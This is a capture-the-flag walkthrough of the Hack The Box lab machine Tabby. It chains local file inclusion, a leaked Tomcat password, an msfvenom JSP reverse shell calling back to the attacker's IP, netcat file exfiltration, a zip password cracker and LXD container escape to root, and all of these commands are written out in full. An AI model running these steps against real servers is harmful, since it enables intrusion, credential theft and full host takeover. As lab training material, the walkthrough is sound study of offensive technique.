# Hack The Box - Tabby

## This is my writeup and walkthrough for tabby from Hack The Box.


![cover](https://user-images.githubusercontent.com/36403473/86299941-cbe51a80-bc01-11ea-801b-3c4a276e6143.jpg)

## an easy linux machine with some vulnerable LFI 

## `Enumeration`
   
#### 1-Nmap 
  `nmap -sC -sV 10.10.10.194`

```
theblock@python-4004:~$ nmap -sC -sV 10.10.10.194
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-02 01:22 EET
Nmap scan report for megahosting.htb (10.10.10.194)
Host is up (0.47s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mega Hosting
8080/tcp open  http    Apache Tomcat
|_http-title: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
###### My focus was on Port 80 `http Apache httpd 2.4.41 ((Ubuntu))` ,and 8080 running a http Apache called `Tomcat`. 

#### 2-website

![Screenshot from 2020-07-02 01-34-45](https://user-images.githubusercontent.com/36403473/86300983-ecfb3a80-bc04-11ea-81d9-2d1be55f2920.png)

##### Ckeck site very well moving to `news` page founding  paramter `file` it maybe vulnerable

![Screenshot from 2020-07-02 01-33-13](https://user-images.githubusercontent.com/36403473/86301124-4cf1e100-bc05-11ea-906c-1b77164f5826.png)

##### First i thought it may be `LFI` and it was right expectation but let’s add 10.10.10.194 to our `/etc/hosts` file  

![Screenshot from 2020-07-02 02-09-29](https://user-images.githubusercontent.com/36403473/86302713-c8ee2800-bc09-11ea-8f35-3453aedf8d99.png)
 
##### the second step is to exploit but i need more information now the role of port `8080`
#####   checking this port `10.10.10.194:8080`


![Screenshot from 2020-07-02 02-23-24](https://user-images.githubusercontent.com/36403473/86303303-bd9bfc00-bc0b-11ea-8ed6-33fa5e11bbab.png)
 
The `CATALINA_HOME` and `CATALINA_BASE` environment variables are used to 
specify the location of Apache Tomcat and the location of its active configuration, respectively.

this information is very important `Users are defined in /etc/tomcat9/tomcat-users.xml.` okey lets see our users using `CATALINA_HOME`
i think its very important to see Apache Tomcat 8 docs ,googling and lets try to get usrs from `tomcat-users.xml`
[Tomcat docs](http://tomcat.apache.org/tomcat-8.5-doc/manager-howto.html)


![lfi](https://user-images.githubusercontent.com/36403473/86301222-95110380-bc05-11ea-8f59-d41dbaa6f153.png)
 very good i have `tomcat` password `$3cureP4s5w0rd123!`
now i can acess `The host-manager` but i dont have any authorization to  upload any shell on this server so lets googling maybe find way.
i found an exploitaion to this server [Tomcat exploitaion](https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/)
now from `LFI` we can get `RCE` 
### Exploitation
 
 Exploitation is  to Generate `.war` Format Backdoor,We can use msfvenom for generating a `.war` format backdoor for java/jsp payload, all you need to do
 is just follow the given below syntax to create a `.war` format file and then run Netcat listener.
 ```
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.120 LPORT=1234 -f war > kk.war
 nc -lvp 1234
 ```
 Deploy A New Application from a Local Path from this path `http://10.10.10.194:8080/manager/text/deploy?path=filename` this mentioned in the documentation 
 
 using curl command to send `.war` file to server 
```
curl --user 'tomcat:$3cureP4s5w0rd123!' --upload-file kk.war "http://10.10.10.194:8080/manager/text/deploy?path=/kk.war"
```
checking context `http://10.10.10.194:8080/manager/text/deploy?config=file:/path/context.xml`

![server file](https://user-images.githubusercontent.com/36403473/86305635-6cdbd180-bc12-11ea-8ace-28c853d22d85.jpg)
###### `kk.war` is uploaded successfully 

![connect2](https://user-images.githubusercontent.com/36403473/86305804-deb41b00-bc12-11ea-9efc-bfa48c11f726.jpg)

connected to machine and upgrade to tty shell  `python3 -c 'import pty; pty.spawn("/bin/bash")'` or to upgrade to full  tty shell use this commands 

 ``` 
    /usr/bin/script -qc /bin/bash /dev/null
     Ctrl-Z
     stty raw -echo
     fg
     Ctrl-Z
    
````
### Privilege Escalation
#### 1- Own User
in this step lets discover system and search for any things that seem important to escalate your privilege
in /home/ash i couldnt go inside lets look deeper 
in `/var/www/html/files` i found `16162020_backup.zip` that need password to be unziped so i copy this zip file from target machine to my machine by nc command 
``` 
target machine 
nc 10.10.16.120 4000 > 16162020_backup.zip
my machine 
nc -l -p 4000 < 16162020_backup.zip
````
i develop simple python code to crack this zip file password 

```
#!/usr/local/bin/python3
from tqdm  import tqdm 
import zipfile
import sys

wordlist = sys.argv[2]
zip_file = sys.argv[1]

zip_file = zipfile.ZipFile(zip_file)
n_words = len(list(open(wordlist, "rb")))

print("Total passwords to test:", n_words)
with open(wordlist, "rb") as wordlist:
    for word in tqdm(wordlist, total=n_words, unit="word"):
        try:
            zip_file.extractall(pwd=word.strip())
        except:
            continue
        else:
            print("[+] Password found:", word.decode().strip())
            exit(0)
print("[!] Password not found, try other wordlist.")
```
the password `admin@it`
And now we owned user ash:
getting usr.txt 

![Screenshot from 2020-07-02 03-54-33](https://user-images.githubusercontent.com/36403473/86308013-7700ce80-bc18-11ea-95c4-3cd1369c46d8.png)

#### 2- Own Root
This step took me a lot of time, although it was not difficult
but finally i own machine lets explian the exploit 
on seeig autherization by `id` 

![Screenshot from 2020-07-02 04-00-23](https://user-images.githubusercontent.com/36403473/86308347-40778380-bc19-11ea-93e7-e5d5122d8379.png)

A member of the local “lxd” group can instantly escalate the privileges to root on the host operating system. 
This is irrespective of whether that user has been granted sudo rights and does not require them to enter their password. 
The vulnerability exists even with the LXD snap package.
[Lxd Privilege Escalation](https://www.hackingarticles.in/lxd-privilege-escalation/)

#### Steps to be performed on the attacker machine:
1-Download build-alpine in your local machine through the git repository. 

2-Execute the script “build -alpine” that will build the latest Alpine image as a compressed file, this step must be executed by the root user.

3-Transfer the tar file to the host machine

```
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine

```
i upload all files on my localhost 

![Screenshot from 2020-06-30 17-24-49](https://user-images.githubusercontent.com/36403473/86310114-8afaff00-bc1d-11ea-856b-551651e35021.png)

on the target machine 
`wget  http://10.10.16.120/lxd-alpine-builder-master/alpine-v3.12-x86_64-20200630_1546.tar.gz` on `/tmp` or /`home`

After the image is built it can be added as an image to LXD as follows:
`lxc image import alpine-v3.12-x86_64-20200630_1546.tar.gz --alias myimage`
`lxc image list`
![lxc](https://user-images.githubusercontent.com/36403473/86310258-e62cf180-bc1d-11ea-92a5-898b77719e79.png)

 ```
 lxc init myimage ignite -c security.privileged=true
 lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
 lxc start ignite
 lxc exec ignite /bin/sh
 id
````
Once inside the container, navigate to /mnt/root to see all resources from the host machine.
After running the bash file. We see that we have a different shell, it is the shell of the container. 
This container has all the files of the host machine. So, we enumerated for the flag and found it.

```
mnt/root/root
ls
flag.txt
cat flag.txt
```
![root](https://user-images.githubusercontent.com/36403473/86310532-a1ee2100-bc1e-11ea-8bb1-bf272f231d6c.png)

#### finally pwned

